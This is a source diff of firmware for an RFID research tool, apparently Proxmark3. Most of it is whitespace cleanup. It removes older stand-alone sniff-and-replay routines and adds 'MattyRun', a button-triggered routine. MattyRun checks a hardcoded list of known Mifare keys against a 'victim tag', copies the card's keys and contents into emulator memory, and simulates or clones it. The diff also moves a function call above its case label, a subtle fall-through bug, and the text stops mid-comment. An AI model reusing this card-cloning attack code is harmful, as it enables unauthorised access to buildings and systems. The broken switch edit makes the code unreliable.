@@ -45,7 +45,7 @@
 // is the order in which they go out on the wire.
 //=============================================================================
 
-#define TOSEND_BUFFER_SIZE (9*MAX_FRAME_SIZE + 1 + 1 + 2)  // 8 data bits and 1 parity bit per payload byte, 1 correction bit, 1 SOC bit, 2 EOC bits 
+#define TOSEND_BUFFER_SIZE (9*MAX_FRAME_SIZE + 1 + 1 + 2)  // 8 data bits and 1 parity bit per payload byte, 1 correction bit, 1 SOC bit, 2 EOC bits
 uint8_t ToSend[TOSEND_BUFFER_SIZE];
 int ToSendMax;
 static int ToSendBit;
@@ -110,26 +110,26 @@ void Dbprintf(const char *fmt, ...) {
 void Dbhexdump(int len, uint8_t *d, bool bAsci) {
 	int l=0,i;
 	char ascii[9];
-    
+
 	while (len>0) {
 		if (len>8) l=8;
 		else l=len;
-		
+
 		memcpy(ascii,d,l);
 		ascii[l]=0;
-		
+
 		// filter safe ascii
 		for (i=0;i<l;i++)
 			if (ascii[i]<32 || ascii[i]>126) ascii[i]='.';
-        
+
 		if (bAsci) {
 			Dbprintf("%-8s %*D",ascii,l,d," ");
 		} else {
 			Dbprintf("%*D",l,d," ");
 		}
-        
+
 		len-=8;
-		d+=8;		
+		d+=8;
 	}
 }
 
@@ -148,17 +148,17 @@ static int ReadAdc(int ch)
 		ADC_MODE_STARTUP_TIME(1  /* was 16 */) |						// Startup Time = (1+1) * 8 / ADC_CLK = 16 / 375kHz = 42,7us     Note: must be > 20us
 		ADC_MODE_SAMPLE_HOLD_TIME(15  /* was 8 */); 					// Sample & Hold Time SHTIM = 15 / ADC_CLK = 15 / 375kHz = 40us
 
-	// Note: ADC_MODE_PRESCALE and ADC_MODE_SAMPLE_HOLD_TIME are set to the maximum allowed value. 
+	// Note: ADC_MODE_PRESCALE and ADC_MODE_SAMPLE_HOLD_TIME are set to the maximum allowed value.
 	// Both AMPL_LO and AMPL_HI are very high impedance (10MOhm) outputs, the input capacitance of the ADC is 12pF (typical). This results in a time constant
-	// of RC = 10MOhm * 12pF = 120us. Even after the maximum configurable sample&hold time of 40us the input capacitor will not be fully charged. 
-	// 
+	// of RC = 10MOhm * 12pF = 120us. Even after the maximum configurable sample&hold time of 40us the input capacitor will not be fully charged.
+	//
 	// The maths are:
 	// If there is a voltage v_in at the input, the voltage v_cap at the capacitor (this is what we are measuring) will be
 	//
 	//       v_cap = v_in * (1 - exp(-RC/SHTIM))  =   v_in * (1 - exp(-3))  =  v_in * 0,95                   (i.e. an error of 5%)
-	// 
+	//
 	// Note: with the "historic" values in the comments above, the error was 34%  !!!
-	
+
 	AT91C_BASE_ADC->ADC_CHER = ADC_CHANNEL(ch);
 
 	AT91C_BASE_ADC->ADC_CR = AT91C_ADC_START;
@@ -185,7 +185,7 @@ int AvgAdc(int ch) // was static - merlok
 void MeasureAntennaTuning(void)
 {
 	uint8_t LF_Results[256];
-	int i, adcval = 0, peak = 0, peakv = 0, peakf = 0; //ptr = 0 
+	int i, adcval = 0, peak = 0, peakv = 0, peakf = 0; //ptr = 0
 	int vLf125 = 0, vLf134 = 0, vHf = 0;	// in mV
 
 	LED_B_ON();
@@ -198,7 +198,7 @@ void MeasureAntennaTuning(void)
  * the resonating frequency of your LF antenna
  * ( hopefully around 95 if it is tuned to 125kHz!)
  */
-  
+
   	FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
 	FpgaWriteConfWord(FPGA_MAJOR_MODE_LF_ADC | FPGA_LF_ADC_READER_FIELD);
 	for (i=255; i>=19; i--) {
@@ -219,7 +219,7 @@ void MeasureAntennaTuning(void)
 	}
 
 	for (i=18; i >= 0; i--) LF_Results[i] = 0;
-	
+
 	LED_A_ON();
 	// Let the FPGA drive the high-frequency antenna around 13.56 MHz.
   	FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
@@ -303,7 +303,7 @@ void SendVersion(void)
 
 // measure the USB Speed by sending SpeedTestBufferSize bytes to client and measuring the elapsed time.
 // Note: this mimics GetFromBigbuf(), i.e. we have the overhead of the UsbCommand structure included.
-void printUSBSpeed(void) 
+void printUSBSpeed(void)
 {
 	Dbprintf("USB Speed:");
 	Dbprintf("  Sending USB packets to client...");
@@ -314,7 +314,7 @@ void printUSBSpeed(void)
 
 	uint32_t start_time = end_time = GetTickCount();
 	uint32_t bytes_transferred = 0;
-	
+
 	LED_B_ON();
 	while(end_time < start_time + USB_SPEED_TEST_MIN_TIME) {
 		cmd_send(CMD_DOWNLOADED_RAW_ADC_SAMPLES_125K, 0, USB_CMD_DATA_SIZE, 0, test_data, USB_CMD_DATA_SIZE);
@@ -325,11 +325,11 @@ void printUSBSpeed(void)
 
 	Dbprintf("  Time elapsed:      %dms", end_time - start_time);
 	Dbprintf("  Bytes transferred: %d", bytes_transferred);
-	Dbprintf("  USB Transfer Speed PM3 -> Client = %d Bytes/s", 
+	Dbprintf("  USB Transfer Speed PM3 -> Client = %d Bytes/s",
 		1000 * bytes_transferred / (end_time - start_time));
 
 }
-	
+
 /**
   * Prints runtime information about the PM3.
 **/
@@ -347,413 +347,6 @@ void SendStatus(void)
 	cmd_send(CMD_ACK,1,0,0,0,0);
 }
 
-#if defined(WITH_ISO14443a_StandAlone) || defined(WITH_LF)
-
-#define OPTS 2
-
-void StandAloneMode()
-{
-	DbpString("Stand-alone mode! No PC necessary.");
-	// Oooh pretty -- notify user we're in elite samy mode now
-	LED(LED_RED,	200);
-	LED(LED_ORANGE, 200);
-	LED(LED_GREEN,	200);
-	LED(LED_ORANGE, 200);
-	LED(LED_RED,	200);
-	LED(LED_ORANGE, 200);
-	LED(LED_GREEN,	200);
-	LED(LED_ORANGE, 200);
-	LED(LED_RED,	200);
-
-}
-
-#endif
-
-
-
-#ifdef WITH_ISO14443a_StandAlone
-void StandAloneMode14a()
-{
-	StandAloneMode();
-	FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
-
-	int selected = 0;
-	int playing = 0, iGotoRecord = 0, iGotoClone = 0;
-	int cardRead[OPTS] = {0};
-	uint8_t readUID[10] = {0};
-	uint32_t uid_1st[OPTS]={0};
-	uint32_t uid_2nd[OPTS]={0};
-	uint32_t uid_tmp1 = 0;
-	uint32_t uid_tmp2 = 0;
-	iso14a_card_select_t hi14a_card[OPTS];
-
-	LED(selected + 1, 0);
-
-	for (;;)
-	{
-		usb_poll();
-		WDT_HIT();
-		SpinDelay(300);
-
-		if (iGotoRecord == 1 || cardRead[selected] == 0)
-		{
-			iGotoRecord = 0;
-			LEDsoff();
-			LED(selected + 1, 0);
-			LED(LED_RED2, 0);
-
-			// record
-			Dbprintf("Enabling iso14443a reader mode for [Bank: %u]...", selected);
-			/* need this delay to prevent catching some weird data */
-			SpinDelay(500);
-			/* Code for reading from 14a tag */
-			uint8_t uid[10]  ={0};
-			uint32_t cuid;
-			iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);
-
-			for ( ; ; )
-			{
-				WDT_HIT();
-				if (BUTTON_PRESS()) {
-					if (cardRead[selected]) {
-						Dbprintf("Button press detected -- replaying card in bank[%d]", selected);
-						break;
-					}
-					else if (cardRead[(selected+1)%OPTS]) {
-						Dbprintf("Button press detected but no card in bank[%d] so playing from bank[%d]", selected, (selected+1)%OPTS);
-						selected = (selected+1)%OPTS;
-						break; // playing = 1;
-					}
-					else {
-						Dbprintf("Button press detected but no stored tag to play. (Ignoring button)");
-						SpinDelay(300);
-					}
-				}
-				if (!iso14443a_select_card(uid, &hi14a_card[selected], &cuid))
-					continue;
-				else
-				{
-					Dbprintf("Read UID:"); Dbhexdump(10,uid,0);
-					memcpy(readUID,uid,10*sizeof(uint8_t));
-					uint8_t *dst = (uint8_t *)&uid_tmp1;
-					// Set UID byte order
-					for (int i=0; i<4; i++)
-						dst[i] = uid[3-i];
-					dst = (uint8_t *)&uid_tmp2;
-					for (int i=0; i<4; i++)
-						dst[i] = uid[7-i];
-					if (uid_1st[(selected+1)%OPTS] == uid_tmp1 && uid_2nd[(selected+1)%OPTS] == uid_tmp2) {
-						Dbprintf("Card selected has same UID as what is stored in the other bank. Skipping.");
-					}
-					else {
-						if (uid_tmp2) {
-							Dbprintf("Bank[%d] received a 7-byte UID",selected);
-							uid_1st[selected] = (uid_tmp1)>>8;
-							uid_2nd[selected] = (uid_tmp1<<24) + (uid_tmp2>>8);
-						}
-						else {
-							Dbprintf("Bank[%d] received a 4-byte UID",selected);
-							uid_1st[selected] = uid_tmp1;
-							uid_2nd[selected] = uid_tmp2;
-						}
-						break;
-					}
-				}
-			}
-			Dbprintf("ATQA = %02X%02X",hi14a_card[selected].atqa[0],hi14a_card[selected].atqa[1]);
-			Dbprintf("SAK = %02X",hi14a_card[selected].sak);
-			LEDsoff();
-			LED(LED_GREEN,  200);
-			LED(LED_ORANGE, 200);
-			LED(LED_GREEN,  200);
-			LED(LED_ORANGE, 200);
-
-			LEDsoff();
-			LED(selected + 1, 0);
-
-			// Next state is replay:
-			playing = 1;
-
-			cardRead[selected] = 1;
-		}
-		/* MF Classic UID clone */
-		else if (iGotoClone==1)
-		{
-			iGotoClone=0;
-			LEDsoff();
-			LED(selected + 1, 0);
-			LED(LED_ORANGE, 250);
-
-
-			// record
-			Dbprintf("Preparing to Clone card [Bank: %x]; uid: %08x", selected, uid_1st[selected]);
-
-			// wait for button to be released
-			while(BUTTON_PRESS())
-			{
-				// Delay cloning until card is in place
-				WDT_HIT();
-			}
-			Dbprintf("Starting clone. [Bank: %u]", selected);
-			// need this delay to prevent catching some weird data
-			SpinDelay(500);
-			// Begin clone function here:
-			/* Example from client/mifarehost.c for commanding a block write for "magic Chinese" cards:
-					UsbCommand c = {CMD_MIFARE_CSETBLOCK, {wantWipe, params & (0xFE | (uid == NULL ? 0:1)), blockNo}};
-					memcpy(c.d.asBytes, data, 16);
-					SendCommand(&c);
-
-					Block read is similar:
-					UsbCommand c = {CMD_MIFARE_CGETBLOCK, {params, 0, blockNo}};
-					We need to imitate that call with blockNo 0 to set a uid.
-
-					The get and set commands are handled in this file:
-					// Work with "magic Chinese" card
-					case CMD_MIFARE_CSETBLOCK:
-						MifareCSetBlock(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
-						break;
-					case CMD_MIFARE_CGETBLOCK:
-						MifareCGetBlock(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
-						break;
-
-				mfCSetUID provides example logic for UID set workflow:
-					-Read block0 from card in field with MifareCGetBlock()
-					-Configure new values without replacing reserved bytes
-							memcpy(block0, uid, 4); // Copy UID bytes from byte array
-							// Mifare UID BCC
-							block0[4] = block0[0]^block0[1]^block0[2]^block0[3]; // BCC on byte 5
-							Bytes 5-7 are reserved SAK and ATQA for mifare classic
-					-Use mfCSetBlock(0, block0, oldUID, wantWipe, CSETBLOCK_SINGLE_OPER) to write it
-			*/
-			uint8_t oldBlock0[16] = {0}, newBlock0[16] = {0}, testBlock0[16] = {0};
-			// arg0 = Flags == CSETBLOCK_SINGLE_OPER=0x1F, arg1=returnSlot, arg2=blockNo
-			MifareCGetBlock(0x3F, 1, 0, oldBlock0);
-			if (oldBlock0[0] == 0 && oldBlock0[0] == oldBlock0[1]  && oldBlock0[1] == oldBlock0[2] && oldBlock0[2] == oldBlock0[3]) {
-				Dbprintf("No changeable tag detected. Returning to replay mode for bank[%d]", selected);
-				playing = 1;
-			}
-			else {
-				Dbprintf("UID from target tag: %02X%02X%02X%02X", oldBlock0[0],oldBlock0[1],oldBlock0[2],oldBlock0[3]);
-				memcpy(newBlock0,oldBlock0,16);
-				// Copy uid_1st for bank (2nd is for longer UIDs not supported if classic)
-
-				newBlock0[0] = uid_1st[selected]>>24;
-				newBlock0[1] = 0xFF & (uid_1st[selected]>>16);
-				newBlock0[2] = 0xFF & (uid_1st[selected]>>8);
-				newBlock0[3] = 0xFF & (uid_1st[selected]);
-				newBlock0[4] = newBlock0[0]^newBlock0[1]^newBlock0[2]^newBlock0[3];
-				// arg0 = needWipe, arg1 = workFlags, arg2 = blockNo, datain
-				MifareCSetBlock(0, 0xFF,0, newBlock0);
-				MifareCGetBlock(0x3F, 1, 0, testBlock0);
-				if (memcmp(testBlock0,newBlock0,16)==0)
-				{
-					DbpString("Cloned successfull!");
-					cardRead[selected] = 0; // Only if the card was cloned successfully should we clear it
-					playing = 0;
-					iGotoRecord = 1;
-					selected = (selected+1) % OPTS;
-				}
-				else {
-					Dbprintf("Clone failed. Back to replay mode on bank[%d]", selected);
-					playing = 1;
-				}
-			}
-			LEDsoff();
-			LED(selected + 1, 0);
-
-		}
-		// Change where to record (or begin playing)
-		else if (playing==1) // button_pressed == BUTTON_SINGLE_CLICK && cardRead[selected])
-		{
-			LEDsoff();
-			LED(selected + 1, 0);
-
-			// Begin transmitting
-			if (playing)
-			{
-				LED(LED_GREEN, 0);
-				DbpString("Playing");
-				for ( ; ; ) {
-					WDT_HIT();
-					int button_action = BUTTON_HELD(1000);
-					if (button_action == 0) { // No button action, proceed with sim
-						uint8_t data[512] = {0}; // in case there is a read command received we shouldn't break
-						Dbprintf("Simulating ISO14443a tag with uid[0]: %08x, uid[1]: %08x [Bank: %u]", uid_1st[selected],uid_2nd[selected],selected);
-						if (hi14a_card[selected].sak == 8 && hi14a_card[selected].atqa[0] == 4 && hi14a_card[selected].atqa[1] == 0) {
-							DbpString("Mifare Classic");
-							SimulateIso14443aTag(1,uid_1st[selected], uid_2nd[selected], data); // Mifare Classic
-						}
-						else if (hi14a_card[selected].sak == 0 && hi14a_card[selected].atqa[0] == 0x44 && hi14a_card[selected].atqa[1] == 0) {
-							DbpString("Mifare Ultralight");
-							SimulateIso14443aTag(2,uid_1st[selected],uid_2nd[selected],data); // Mifare Ultralight
-						}
-						else if (hi14a_card[selected].sak == 20 && hi14a_card[selected].atqa[0] == 0x44 && hi14a_card[selected].atqa[1] == 3) {
-							DbpString("Mifare DESFire");
-							SimulateIso14443aTag(3,uid_1st[selected],uid_2nd[selected],data); // Mifare DESFire
-						}
-						else {
-							Dbprintf("Unrecognized tag type -- defaulting to Mifare Classic emulation");
-							SimulateIso14443aTag(1,uid_1st[selected], uid_2nd[selected], data);
-						}
-					}
-					else if (button_action == BUTTON_SINGLE_CLICK) {
-						selected = (selected + 1) % OPTS;
-						Dbprintf("Done playing. Switching to record mode on bank %d",selected);
-						iGotoRecord = 1;
-						break;
-					}
-					else if (button_action == BUTTON_HOLD) {
-						Dbprintf("Playtime over. Begin cloning...");
-						iGotoClone = 1;
-						break;
-					}
-					WDT_HIT();
-				}
-
-				/* We pressed a button so ignore it here with a delay */
-				SpinDelay(300);
-				LEDsoff();
-				LED(selected + 1, 0);
-			}
-			else
-				while(BUTTON_PRESS())
-					WDT_HIT();
-		}
-	}
-}
-#elif WITH_LF
-// samy's sniff and repeat routine
-void SamyRun()
-{
-	StandAloneMode();
-	FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
-
-	int high[OPTS], low[OPTS];
-	int selected = 0;
-	int playing = 0;
-	int cardRead = 0;
-
-	// Turn on selected LED
-	LED(selected + 1, 0);
-
-	for (;;)
-	{
-		usb_poll();
-		WDT_HIT();
-
-		// Was our button held down or pressed?
-		int button_pressed = BUTTON_HELD(1000);
-		SpinDelay(300);
-
-		// Button was held for a second, begin recording
-		if (button_pressed > 0 && cardRead == 0)
-		{
-			LEDsoff();
-			LED(selected + 1, 0);
-			LED(LED_RED2, 0);
-
-			// record
-			DbpString("Starting recording");
-
-			// wait for button to be released
-			while(BUTTON_PRESS())
-				WDT_HIT();
-
-			/* need this delay to prevent catching some weird data */
-			SpinDelay(500);
-
-			CmdHIDdemodFSK(1, &high[selected], &low[selected], 0);
-			Dbprintf("Recorded %x %x%08x", selected, high[selected], low[selected]);
-
-			LEDsoff();
-			LED(selected + 1, 0);
-			// Finished recording
-
-			// If we were previously playing, set playing off
-			// so next button push begins playing what we recorded
-			playing = 0;
-			
-			cardRead = 1;
-	
-		}
-
-		else if (button_pressed > 0 && cardRead == 1)
-		{
-					LEDsoff();
-					LED(selected + 1, 0);
-					LED(LED_ORANGE, 0);
-
-					// record
-					Dbprintf("Cloning %x %x%08x", selected, high[selected], low[selected]);
-
-					// wait for button to be released
-					while(BUTTON_PRESS())
-						WDT_HIT();
-
-					/* need this delay to prevent catching some weird data */
-					SpinDelay(500);
-
-					CopyHIDtoT55x7(0, high[selected], low[selected], 0);
-					Dbprintf("Cloned %x %x%08x", selected, high[selected], low[selected]);
-
-					LEDsoff();
-					LED(selected + 1, 0);
-					// Finished recording
-
-					// If we were previously playing, set playing off
-					// so next button push begins playing what we recorded
-					playing = 0;
-					
-					cardRead = 0;
-			
-		}
-
-		// Change where to record (or begin playing)
-		else if (button_pressed)
-		{
-			// Next option if we were previously playing
-			if (playing)
-				selected = (selected + 1) % OPTS;
-			playing = !playing;
-
-			LEDsoff();
-			LED(selected + 1, 0);
-
-			// Begin transmitting
-			if (playing)
-			{
-				LED(LED_GREEN, 0);
-				DbpString("Playing");
-				// wait for button to be released
-				while(BUTTON_PRESS())
-					WDT_HIT();
-				Dbprintf("%x %x%08x", selected, high[selected], low[selected]);
-				CmdHIDsimTAG(high[selected], low[selected], 0);
-				DbpString("Done playing");
-				if (BUTTON_HELD(1000) > 0)
-					{
-					DbpString("Exiting");
-					LEDsoff();
-					return;
-					}
-
-				/* We pressed a button so ignore it here with a delay */
-				SpinDelay(300);
-
-				// when done, we're done playing, move to next option
-				selected = (selected + 1) % OPTS;
-				playing = !playing;
-				LEDsoff();
-				LED(selected + 1, 0);
-			}
-			else
-				while(BUTTON_PRESS())
-					WDT_HIT();
-		}
-	}
-}
-
-#endif
 /*
 OBJECTIVE
 Listen and detect an external reader. Determine the best location
@@ -842,7 +435,7 @@ void ListenReaderField(int limit)
 
 		if (limit != HF_ONLY) {
 			if(mode == 1) {
-				if (abs(lf_av - lf_baseline) > REPORT_CHANGE) 
+				if (abs(lf_av - lf_baseline) > REPORT_CHANGE)
 					LED_D_ON();
 				else
 					LED_D_OFF();
@@ -860,7 +453,7 @@ void ListenReaderField(int limit)
 
 		if (limit != LF_ONLY) {
 			if (mode == 1){
-				if (abs(hf_av - hf_baseline) > REPORT_CHANGE) 	
+				if (abs(hf_av - hf_baseline) > REPORT_CHANGE)
 					LED_B_ON();
 				else
 					LED_B_OFF();
@@ -910,7 +503,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 	UsbCommand *c = (UsbCommand *)packet;
 
 //  Dbprintf("received %d bytes, with command: 0x%04x and args: %d %d %d",len,c->cmd,c->arg[0],c->arg[1],c->arg[2]);
-  
+
 	switch(c->cmd) {
 #ifdef WITH_LF
 		case CMD_SET_LF_SAMPLING_CONFIG:
@@ -970,7 +563,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 			SimulateTagLowFrequencyBidir(c->arg[0], c->arg[1]);
 			break;
 		case CMD_INDALA_CLONE_TAG:
-			CopyIndala64toT55x7(c->arg[0], c->arg[1]);					
+			CopyIndala64toT55x7(c->arg[0], c->arg[1]);
 			break;
 		case CMD_INDALA_CLONE_TAG_L:
 			CopyIndala224toT55x7(c->d.asDwords[0], c->d.asDwords[1], c->d.asDwords[2], c->d.asDwords[3], c->d.asDwords[4], c->d.asDwords[5], c->d.asDwords[6]);
@@ -1038,15 +631,15 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_RECORD_RAW_ADC_SAMPLES_ISO_15693:
 			RecordRawAdcSamplesIso15693();
 			break;
-			
+
 		case CMD_ISO_15693_COMMAND:
 			DirectTag15693Command(c->arg[0],c->arg[1],c->arg[2],c->d.asBytes);
 			break;
-					
+
 		case CMD_ISO_15693_FIND_AFI:
 			BruteforceIso15693Afi(c->arg[0]);
-			break;	
-			
+			break;
+
 		case CMD_ISO_15693_DEBUG:
 			SetDebugIso15693(c->arg[0]);
 			break;
@@ -1101,14 +694,14 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_SIMULATE_TAG_ISO_14443a:
 			SimulateIso14443aTag(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);  // ## Simulate iso14443a tag - pass tag type & UID
 			break;
-			
+
 		case CMD_EPA_PACE_COLLECT_NONCE:
 			EPA_PACE_Collect_Nonce(c);
 			break;
 		case CMD_EPA_PACE_REPLAY:
 			EPA_PACE_Replay(c);
 			break;
-			
+
 		case CMD_READER_MIFARE:
 			ReaderMifare(c->arg[0]);
 			break;
@@ -1124,7 +717,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_MIFAREU_READCARD:
 			MifareUReadCard(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
 			break;
-		case CMD_MIFAREUC_SETPWD: 
+		case CMD_MIFAREUC_SETPWD:
 			MifareUSetPwd(c->arg[0], c->d.asBytes);
 			break;
 		case CMD_MIFARE_READSC:
@@ -1148,7 +741,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_SIMULATE_MIFARE_CARD:
 			Mifare1ksim(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
 			break;
-		
+
 		// emulator
 		case CMD_MIFARE_SET_DBGMODE:
 			MifareSetDbgLvl(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
@@ -1165,7 +758,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_MIFARE_EML_CARDLOAD:
 			MifareECardLoad(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
 			break;
-			
+
 		// Work with "magic Chinese" card
 		case CMD_MIFARE_CSETBLOCK:
 			MifareCSetBlock(c->arg[0], c->arg[1], c->arg[2], c->d.asBytes);
@@ -1176,7 +769,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_MIFARE_CIDENT:
 			MifareCIdent();
 			break;
-			
+
 		// mifare sniffer
 		case CMD_MIFARE_SNIFFER:
 			SniffMifare(c->arg[0]);
@@ -1198,8 +791,8 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_READER_ICLASS_REPLAY:
 			ReaderIClass_Replay(c->arg[0], c->d.asBytes);
 			break;
-		case CMD_ICLASS_EML_MEMSET:
 			emlSet(c->d.asBytes,c->arg[0], c->arg[1]);
+		case CMD_ICLASS_EML_MEMSET:
 			break;
 		case CMD_ICLASS_WRITEBLOCK:
 			iClass_WriteBlock(c->arg[0], c->d.asBytes);
@@ -1266,7 +859,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 			memcpy(b+c->arg[0], c->d.asBytes, USB_CMD_DATA_SIZE);
 			cmd_send(CMD_ACK,0,0,0,0,0);
 			break;
-		}	
+		}
 		case CMD_READ_MEM:
 			ReadMem(c->arg[0]);
 			break;
@@ -1326,7 +919,7 @@ void UsbPacketReceived(uint8_t *packet, int len)
 		case CMD_DEVICE_INFO: {
 			uint32_t dev_info = DEVICE_INFO_FLAG_OSIMAGE_PRESENT | DEVICE_INFO_FLAG_CURRENT_MODE_OS;
 			if(common_area.flags.bootrom_present) dev_info |= DEVICE_INFO_FLAG_BOOTROM_PRESENT;
-			cmd_send(CMD_DEVICE_INFO,dev_info,0,0,0,0);	
+			cmd_send(CMD_DEVICE_INFO,dev_info,0,0,0,0);
 			break;
 		}
 		default:
@@ -1334,6 +927,8 @@ void UsbPacketReceived(uint8_t *packet, int len)
 			break;
 	}
 }
+
+
 
 void  __attribute__((noreturn)) AppMain(void)
 {
@@ -1374,14 +969,14 @@ void  __attribute__((noreturn)) AppMain(void)
 	FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
 
 	StartTickCount();
-  	
+
 #ifdef WITH_LCD
 	LCDInit();
 #endif
 
   byte_t rx[sizeof(UsbCommand)];
 	size_t rx_len;
-  
+
 	for(;;) {
     if (usb_poll()) {
       rx_len = usb_read(rx,sizeof(UsbCommand));
@@ -1391,17 +986,251 @@ void  __attribute__((noreturn)) AppMain(void)
     }
 		WDT_HIT();
 
-#ifdef WITH_LF
-#ifndef WITH_ISO14443a_StandAlone
-		if (BUTTON_HELD(1000) > 0)
-			SamyRun();
-#endif
-#endif
 #ifdef WITH_ISO14443a
-#ifdef WITH_ISO14443a_StandAlone
-		if (BUTTON_HELD(1000) > 0)
-			StandAloneMode14a();
+		if (BUTTON_HELD(2000) > 0)
+			MattyRun();
 #endif
+	}
+}
+
+#if defined(WITH_ISO14443a_StandAlone) || defined(WITH_LF)
+
+#define OPTS 2
+
+void StandAloneMode()
+{
+	DbpString("##################################");
+	DbpString("##################################");
+	DbpString("Stand-alone mode! No PC necessary.");
+	DbpString("##################################");
+	DbpString("##################################");
+
+	LED(LED_RED,	200);
+	LED(LED_ORANGE, 200);
+	LED(LED_GREEN,	200);
+	LED(LED_ORANGE, 200);
+	LED(LED_RED,	200);
+	LED(LED_ORANGE, 200);
+	LED(LED_GREEN,	200);
+	LED(LED_ORANGE, 200);
+	LED(LED_RED,	200);
+
+}
+
 #endif
+
+
+void MattyRun()
+{
+	/*
+		It will check if the keys from the attacked tag are a subset from
+		the hardcoded set of keys inside of the FPGA. If this is the case
+		then it will load the keys into the emulator memory and also the
+		content of the victim tag, to finally simulate it.
+
+		Finally, it may be dumped into a blank card.
+
+		This source code has been tested only in Mifare 1k.
+	*/
+
+    StandAloneMode();
+    // FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
+
+    /*
+		Pseudo-configuration block.
+
+    */
+	char keyTypec = '?'; // 'A'/'B' or both keys '?'
+	bool printKeys = false; // Prints keys
+	bool transferToEml = true; // Transfer keys to emulator memory
+	bool ecfill = true; // Fill emulator memory with cards content.
+	bool simulation = true; // Simulates an exact copy of the target tag
+	bool fillFromEmulator = false;
+
+	uint16_t mifare_size = 1024; // Mifare 1k (only 1k supported for now)
+	uint8_t sectorSize = 64; // 1k's sector size is 64 bytes.
+	uint8_t blockNo = 3; // Security block is number 3 for each sector.
+	uint8_t sectorsCnt = (mifare_size/sectorSize);
+	uint8_t keyType; // Keytype buffer
+	uint64_t key64; // Defines current key
+	uint8_t *keyBlock = NULL; // Where the keys will be held in memory.
+	uint8_t stKeyBlock = 20; // Set the quantity of keys in the block.
+	uint8_t filled = 0; // Used to check if the memory was filled with success.
+
+	/*
+		Set of keys to be used.
+	*/
+	uint64_t mfKeys[] = {
+		0xffffffffffff, // Default key
+		0x000000000000, // Blank key
+		0xa0a1a2a3a4a5, // NFCForum MAD key
+		0xb0b1b2b3b4b5,
+		0xaabbccddeeff,
+		0x4d3a99c351dd,
+		0x1a982c7e459a,
+		0xd3f7d3f7d3f7,
+		0x714c5c886e97,
+		0x587ee5f9350f,
+		0xa0478cc39091,
+		0x533cb6c723f6,
+		0x8fd0a4f256e9,
+	};
+
+	/*
+		This part allocates the byte representation of the
+		keys in keyBlock's memory space .
+	*/
+	keyBlock = BigBuf_malloc(stKeyBlock * 6);
+	int mfKeysCnt = sizeof(mfKeys) / sizeof(uint64_t);
+
+	for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++)
+	{
+		num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t*)(keyBlock + mfKeyCounter * 6));
+	}
+
+	/*
+		Simple switch just to handle keytpes.
+	*/
+	switch (keyTypec) {
+	case 'a': case 'A':
+		keyType = !0;
+		break;
+	case 'b': case 'B':
+		keyType = !1;
+		break;
+	case '?':
+		keyType = 2;
+		break;
+	default:
+		Dbprintf("[!] Key type must be A , B or ?");
+		keyType = 2;
+	}
+
+	/*
+		Pretty print of the keys to be checked.
+	*/
+	if (printKeys == true) {
+		Dbprintf("[+] Printing mf keys");
+		for (uint8_t keycnt = 0; keycnt < mfKeysCnt; keycnt++)
+			Dbprintf("[-] chk mf key[%2d] %02x%02x%02x%02x%02x%02x", keycnt,
+				(keyBlock + 6*keycnt)[0],(keyBlock + 6*keycnt)[1], (keyBlock + 6*keycnt)[2],
+				(keyBlock + 6*keycnt)[3], (keyBlock + 6*keycnt)[4],	(keyBlock + 6*keycnt)[5], 6);
+		DbpString("--------------------------------------------------------");
+	}
+
+	/*
+		Initialization of validKeys and foundKeys storages.
+		- validKey will store whether the sector has a valid A/B key.
+		- foundKey will store the found A/B key for each sector.
+	*/
+	bool validKey[2][40];
+	uint8_t foundKey[2][40][6];
+	for (uint16_t t = 0; t < 2; t++) {
+		for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
+			validKey[t][sectorNo] = false;
+			for (uint16_t i = 0; i < 6; i++) {
+				foundKey[t][sectorNo][i] = 0xff;
+			}
+		}
+	}
+
+	/*
+		Iterates through each sector checking if there is a correct key.
+	*/
+	int key = -1;
+	int block = 0;
+	bool err = 0;
+	uint32_t size = mfKeysCnt;
+	for (int type = !keyType; type < 2 && !err; keyType == 2 ? (type++) : (type = 2)) {
+		block = blockNo;
+		for (int sec = 0; sec < sectorsCnt && !err; ++sec) {
+			Dbprintf("\tCurrent sector:%3d, block:%3d, key type: %c, key count: %i ", sec, block, type ? 'B':'A', mfKeysCnt);
+			key = saMifareChkKeys(block, type, true, size, &keyBlock[0], &key64);
+			if (key == -1) {
+				Dbprintf("\t✕ Key error, stopping.");
+				err = 1;
+				break;
+			} else {
+				num_to_bytes(key64, 6, foundKey[type][sec]);
+				validKey[type][sec] = true;
+				Dbprintf("\t✓ Found valid key: [%02x%02x%02x%02x%02x%02x]\n", (keyBlock + 6*key)[0],(keyBlock + 6*key)[1], (keyBlock + 6*key)[2],(keyBlock + 6*key)[3], (keyBlock + 6*key)[4], (keyBlock + 6*key)[5], 6);
+			}
+		block < 127 ? (block += 4) : (block += 16);
+		}
+	}
+
+
+	/*
+		TODO: This.
+
+		If at least one key was found, start a nested attack based on that key, and continue.
+	*/
+	if (err) {
+		Dbprintf("\t✕ There's currently no nested attack in MattyRun, sorry!");
+		LED_C_ON(); //red
+	}
+
+
+	/*
